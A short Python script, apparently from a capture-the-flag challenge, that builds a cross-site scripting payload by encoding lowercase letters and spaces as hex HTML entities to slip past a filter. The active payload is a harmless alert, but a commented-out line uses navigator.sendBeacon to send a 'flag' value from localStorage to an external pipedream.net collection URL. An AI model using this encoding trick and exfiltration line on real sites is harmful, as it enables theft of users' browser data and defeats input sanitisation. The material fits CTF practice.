#!/usr/bin/env python3
from urllib.parse import urlencode
payload = ""
url = "https://enuz6evb9ok23xn.m.pipedream.net"
p = 'localStorage.getItem("flag")'
#pay = f'navigator.sendBeacon("{url}",{p})'
pay="alert('hello krn')"
print(pay)
for c in pay:
  if c.islower() or c==' ':
    payload+="&#X"+hex(ord(c))[2:]+";"
  else:
    payload+=c
print(payload)

    
